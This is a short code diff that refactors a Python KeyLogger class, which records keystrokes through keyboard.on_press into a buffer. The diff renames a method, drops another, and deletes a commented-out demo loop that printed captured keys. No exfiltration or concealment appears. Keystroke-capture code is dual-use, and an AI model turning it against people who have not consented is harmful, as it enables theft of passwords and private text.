@@ -34,23 +34,8 @@ class KeyLogger:
         self.buffer = {}
         return data
 
-    def stop_continue(self, status: bool):
+    def stop_and_continue(self, status: bool):
         self.running = status
 
     def start(self):
         keyboard.on_press(self.log_event)
-
-    def continue_listen(self):
-        self.running = True
-
-#
-# if __name__ == "__main__":
-#     keylogger = KeyLogger("keylogger")
-#
-#     try:
-#         keylogger.start()
-#         while True:
-#             time.sleep(5)
-#             print(keylogger.get_and_clear_buffer())
-#     except KeyboardInterrupt:
-#         keylogger.stop()
